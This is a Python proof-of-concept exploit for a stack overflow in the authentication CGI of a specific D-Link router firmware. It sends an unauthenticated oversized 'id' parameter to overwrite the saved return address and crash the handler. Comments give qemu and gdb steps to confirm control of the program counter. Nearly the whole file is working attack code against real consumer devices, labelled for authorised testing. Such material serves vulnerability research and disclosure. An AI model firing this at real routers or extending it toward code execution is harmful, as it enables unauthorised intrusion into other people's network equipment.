#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Minimal crash PoC — D-Link DIR-868L B1 fw 2.01b05 cgibin authentication handler
================================================================================
Demonstrates return-address control via the unauthenticated `id` URL parameter.
Sends a 1864-byte `id` value: 1860 filler bytes + 4-byte marker ("BBBB").
Expected result: the CGI process dies at the function epilogue
(POP {R11,PC}, offset 0x14CBC) with PC loaded from the marker, i.e. an
HTTP 500 (or connection reset) instead of the normal JSON response.

Two modes:
  1) remote : python3 poc_crash.py 192.168.0.1            (device web UI, port 80)
              python3 poc_crash.py 192.168.0.1 --port 8181 --path dws/api/Login
  2) local  : reproduce under qemu-arm + gdb (see VERIFY below)

Authorized testing only.
"""
import argparse
import socket
import sys

MARKER = b"BBBB"
ID_LEN = 1864          # 0x748: exactly one byte past the saved LR slot
SHELL_JSON = b'{"RESULT"'


def http(host, port, path, timeout=6):
    idv = b"A" * (ID_LEN - len(MARKER)) + MARKER
    req = (f"GET /{path}?id=".encode() + idv +
           b"&password=x HTTP/1.0\r\nHost: h\r\n\r\n")
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(req)
    s.settimeout(timeout)
    data = b""
    try:
        while True:
            c = s.recv(4096)
            if not c:
                break
            data += c
    except socket.timeout:
        pass
    s.close()
    return data


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("host")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--path", default="webfa_authentication.cgi",
                    help="endpoint basename, e.g. authentication.cgi or dws/api/Login")
    a = ap.parse_args()

    # baseline: benign request
    base = http(a.host, a.port, a.path) if False else None
    print(f"[*] sending crash PoC to {a.host}:{a.port}/{a.path} ...")
    data = http(a.host, a.port, a.path)
    status = data.split(b"\r\n", 1)[0].decode("latin1") if data else "(no response / reset)"
    print(f"[*] response: {status}")
    if data and SHELL_JSON in data:
        print("[-] got a normal JSON response - overflow did not fire "
              "(check firmware version / endpoint)")
        return 1
    print("[+] no JSON response (500 / connection reset) => CGI died at the "
          "epilogue after the overflow - crash confirmed")
    print("[i] verify return-address control: re-run with a De Bruijn pattern "
          "as the id value and read the faulting PC (offset 0x744)")
    return 0


# ---------------------------------------------------------------------------
# VERIFY (return-address control) under qemu-user + gdb:
#
#   FW=squashfs-root
#   ln -sf $FW/htdocs/cgibin webfa_authentication.cgi
#   A=$(python3 -c "from pwn import cyclic;print(cyclic(1860,n=8).decode())")
#   env REQUEST_METHOD=BOGUS \
#       REQUEST_URI="/webfa_authentication.cgi?id=${A}BBBB&password=x" \
#       REMOTE_ADDR=1.2.3.4 \
#       qemu-arm -L $FW -g 1234 ./webfa_authentication.cgi &
#   gdb-multiarch $FW/htdocs/cgibin
#     (gdb) set architecture arm
#     (gdb) target remote :1234
#     (gdb) b *0x147E4          # after the first strcpy
#     (gdb) c
#     (gdb) x/2wx $r11-4        # saved R11 / saved LR -> cyclic pattern
#     (gdb) p/x $r11            # r0 = 0x42424242-style marker at offset 0x744
#
#   Expected: saved LR = 0x42424242 (from the "BBBB" tail), proving
#   control of the return address from an unauthenticated GET parameter.
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    sys.exit(main())
